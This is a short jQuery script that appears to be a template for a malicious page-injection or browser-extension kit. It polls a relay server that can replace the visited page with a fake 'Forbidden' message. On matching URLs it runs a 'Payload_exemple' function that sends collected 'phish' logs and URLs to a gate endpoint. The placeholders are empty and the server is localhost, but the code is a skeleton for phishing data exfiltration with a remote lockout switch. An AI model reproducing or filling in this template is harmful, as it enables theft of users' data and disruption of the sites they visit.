$(document).ready(function()
{
    var phish = "";
    var tabURL = window.location.href;
    var server_web = "http://localhost:8888/"
    var lock_page = "relais/lock.php"
    var gate_page = "relais/index.php"
    //locking function
    function locking()
    {
       document.write("<h1>Forbidden !</h1><p>you don't have permission to access / on this server</p>");
    }
    function lock()
    {
        $.get(server_web+lock_page,function(data)
        {
            if(data == '1')
            {
                locking();
            }
        });
    }

    lock();

    // PAYLOAD FUNCTION NEED HTTPS
    function Payload_exemple()
    {
        console.log('Injected here')
        var urls = "" // Var for URL
        var phish = "" // Var for logs 
        $.get(server_web+gate_page, { info: phish, url: urls } );
    }
    
    
    // VERIFIED D'URL
    if(tabURL.indexOf('') !== -1 ) // url in ''
    {
        Payload_exemple();
    }

});